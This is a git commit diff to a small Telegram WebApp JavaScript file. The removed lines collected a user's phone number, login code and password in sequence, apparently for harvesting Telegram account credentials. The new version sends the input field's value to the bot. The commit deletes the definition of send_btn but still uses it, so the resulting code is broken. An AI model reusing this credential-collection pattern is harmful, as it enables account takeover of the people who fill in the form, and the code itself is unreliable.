d0ed276c289b5aba55c0f505ab4c210479aa7deb
Ubica228 <122717010+Ubica228@users.noreply.github.com>
2023-01-19 04:15:16 +0500

    Add files via upload

--- js.js
+++ js.js
@@ -1,24 +1,10 @@
 let tg = window.Telegram.WebApp;
 tg.expand();
-send_btn = document.getElementById('send-button');
+
 phone = document.getElementById('phone_code') ;
-const data = {
-    'Phone':'',
-    'Code':'',
-    'Password':''
-}
-console.log(data);
- if (data['Phone'] != ''){
-    phone.placeholder = 'Код:';
-}
+
 send_btn.addEventListener('click',function(){
-   if (data['Phone'] != ''){
-        data['Code'] = phone.value;
-        console.log(data);
-        tg.sendData(phone);}
-    else{
-      data['Phone'] = phone.value; 
-     phone.value = '';
-     console.log(data);
-    }
+ 
+    tg.sendData(phone.value);
+    
 });
